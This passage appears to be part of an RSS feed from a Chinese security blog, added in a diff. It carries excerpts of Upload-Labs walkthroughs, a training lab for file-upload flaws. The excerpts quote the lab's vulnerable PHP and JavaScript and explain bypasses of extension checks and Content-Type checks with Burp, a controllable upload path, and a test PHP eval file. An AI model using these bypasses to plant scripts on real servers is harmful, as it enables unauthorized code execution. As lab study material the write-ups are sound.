+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file,$img_path)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了&lt;code>$_GET['save_path']&lt;/code>，本题提示也写道&lt;/p>
+&lt;p>&lt;code>本pass上传路径可控！&lt;/code>，就是通过这个GET变量控制上传路径。&lt;/p>
+&lt;p>​	这一关的突破方法需要有一些条件：php版本需要低于&lt;code>5.3.29&lt;/code>（我使用的是php版本5.3.17的本地靶机），另一个条件是&lt;code>magic_quotes_gpc&lt;/code>需要为关闭状态。&lt;code>magic_quotes_gpc&lt;/code>的作用官方文档写道：&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Warning&lt;/strong> 本特性已自 PHP 5.3.0 起&lt;em>废弃&lt;/em>并将自 PHP 5.4.0 起&lt;em>移除&lt;/em>。&lt;/p>
+&lt;p>​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &amp;rsquo; (单引号)、&amp;quot; (双引号)、\（反斜杠）和 NUL&amp;rsquo;s 被一个反斜杠自动转义。&lt;/p></description></item><item><title>Upload-Labs(二)</title><link>/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate><guid>/posts/ctf/upload-labs2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>​	这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。&lt;/p>
+&lt;pre tabindex="0">&lt;code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&amp;#39;submit&amp;#39;])) {
+ if (file_exists(UPLOAD_PATH)) {
+ //这里下面是过滤
+ $deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);
+ $file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
+ $file_name = deldot($file_name);//删除文件名末尾的点
+ $file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
+ $file_ext = strtolower($file_ext); //转换为小写
+ $file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
+ $file_ext = trim($file_ext); //首尾去空
+
+	//这里下面是移动文件。
+ 	if (!in_array($file_ext, $deny_ext)) {
+ $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
+ $img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
+ if (move_uploaded_file($temp_file, $img_path)) {
+ $is_upload = true;
+ } else {
+ $msg = &amp;#39;上传出错！&amp;#39;;
+ }
+ } else {
+ $msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
+ }
+ 
+ } else {
+ $msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
+ }
+}
+&lt;/code>&lt;/pre>&lt;p>过滤部分：&lt;/p></description></item><item><title>Upload-Labs(一)</title><link>/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate><guid>/posts/ctf/upload-labs1/</guid><description>&lt;h2 id="介绍">介绍&lt;/h2>
+&lt;blockquote>
+&lt;p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。&lt;/p>
+&lt;/blockquote>
+&lt;p>在线靶机地址：&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windows环境&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="pass-01">Pass-01&lt;/h2>
+&lt;p>​	尝试上传php木马，发现提示上传错误&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png" alt="">&lt;/p>
+&lt;p>​	提示只能上传&lt;code>jpg、png、gif&lt;/code>类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。&lt;/p>
+&lt;p>​	源码：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">checkFile&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementsByName&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">value&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//定义允许上传的文件类型
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//提取上传文件的类型
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">substring&lt;/span>(&lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">lastIndexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//判断上传文件类型是否允许上传
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">allow_ext&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;|&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">errMsg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#a6e22e">errMsg&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	把文件后缀名改成jpg格式上传，使用&lt;strong>burp suit&lt;/strong>抓包。把&lt;code>.jpg&lt;/code>后缀重新改为&lt;code>.php&lt;/code>即可实现绕过前端JS代码。&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png" alt="">&lt;/p>
+&lt;p>​	然后右键打开图片，代码成功执行。完工&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png" alt="">&lt;/p>
+&lt;p>​	注：后面题目的php代码都使用&lt;code>2333.php&lt;/code>：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#a6e22e">phpinfo&lt;/span>());
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	执行结果是打印出php版本信息。&lt;/p>
+&lt;h2 id="pass-02">Pass-02&lt;/h2>
+&lt;p>​	源码：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file_exists&lt;/span>(&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/png&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/gif&amp;#39;&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>] 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $img_path)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;文件类型不正确，请重新上传！&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	发现文件判断是根据&lt;code>image/jpeg、image/png...&lt;/code>进行过滤判定，这些值都是Http请求中的&lt;strong>Content-Type&lt;/strong>常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:&lt;a href="https://www.cnblogs.com/klb561/p/10090540.html">Http请求中Content-Type&lt;/a>。&lt;/p></description></item></channel></rss>
